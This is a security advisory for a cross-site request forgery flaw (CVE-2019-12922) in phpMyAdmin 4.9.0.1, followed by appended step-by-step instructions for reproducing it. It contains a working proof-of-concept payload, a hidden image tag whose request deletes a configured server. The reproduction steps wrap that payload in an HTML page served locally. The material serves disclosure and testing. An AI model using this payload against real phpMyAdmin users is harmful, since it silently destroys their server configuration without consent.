=============================================
MGC ALERT 2019-003
- Original release date: June 13, 2019
- Last revised:  September 13, 2019
- Discovered by: Manuel Garcia Cardenas
- Severity: 4,3/10 (CVSS Base Score)
- CVE-ID: CVE-2019-12922
=============================================

I. VULNERABILITY
-------------------------
phpMyAdmin 4.9.0.1 - Cross-Site Request Forgery

II. BACKGROUND
-------------------------
phpMyAdmin is a free software tool written in PHP, intended to handle the
administration of MySQL over the Web. phpMyAdmin supports a wide range of
operations on MySQL and MariaDB.

III. DESCRIPTION
-------------------------
Has been detected a Cross-Site Request Forgery in phpMyAdmin, that allows
an attacker to trigger a CSRF attack against a phpMyAdmin user deleting any
server in the Setup page.

IV. PROOF OF CONCEPT
-------------------------
Exploit CSRF - Deleting main server

<p>Deleting Server 1</p>
<img src="
http://server/phpmyadmin/setup/index.php?page=servers&mode=remove&id=1"
style="display:none;" />

V. BUSINESS IMPACT
-------------------------
The attacker can easily create a fake hyperlink containing the request that
wants to execute on behalf the user,in this way making possible a CSRF
attack due to the wrong use of HTTP method.

VI. SYSTEMS AFFECTED
-------------------------
phpMyAdmin <= 4.9.0.1

VII. SOLUTION
-------------------------
Implement in each call the validation of the token variable, as already
done in other phpMyAdmin requests.

VIII. REFERENCES
-------------------------
https://www.phpmyadmin.net/

IX. CREDITS
-------------------------
This vulnerability has been discovered and reported
by Manuel Garcia Cardenas (advidsec (at) gmail (dot) com).

X. REVISION HISTORY
-------------------------
June 13, 2019 1: Initial release
September 13, 2019 2: Last revision

XI. DISCLOSURE TIMELINE
-------------------------
June 13, 2019 1: Vulnerability acquired by Manuel Garcia Cardenas
June 13, 2019 2: Send to vendor
July 16, 2019 3: New request to vendor without fix date
September 13, 2019 4: Sent to lists

XII. LEGAL NOTICES
-------------------------
The information contained within this advisory is supplied "as-is" with no
warranties or guarantees of fitness of use or otherwise.

XIII. ABOUT
-------------------------
Manuel Garcia Cardenas
Pentester




Instructions:

Setup Environment
Ensure phpMyAdmin 4.9.0.1 is installed and running.
Make sure you have access to the phpMyAdmin web interface with administrative privileges.


Open your browser and log in to the phpMyAdmin interface using your administrative credentials.


Open a text editor and create a new file.

Copy and paste the following code into the file:
<html>
<body>
  <p>Deleting Server 1</p>
  <img src="http://YOUR_SERVER_ADDRESS/phpmyadmin/setup/index.php?page=servers&mode=remove&id=1" style="display:none;" />
</body>
</html>

Replace YOUR_SERVER_ADDRESS with the actual address of your phpMyAdmin instance.

Save the file as delete_server.html.


You can use a simple local HTTP server to serve this file. For example, if you have Python installed, you can use:
python3 -m http.server 8000


Place the delete_server.html file in the directory where you start the server. Navigate to http://localhost:8000/delete_server.html to ensure it's being served correctly.


Open the delete_server.html file in a web browser. This will send a request to delete the server configured in phpMyAdmin.


Go back to your phpMyAdmin interface and check the Setup page to verify if the server has been deleted.



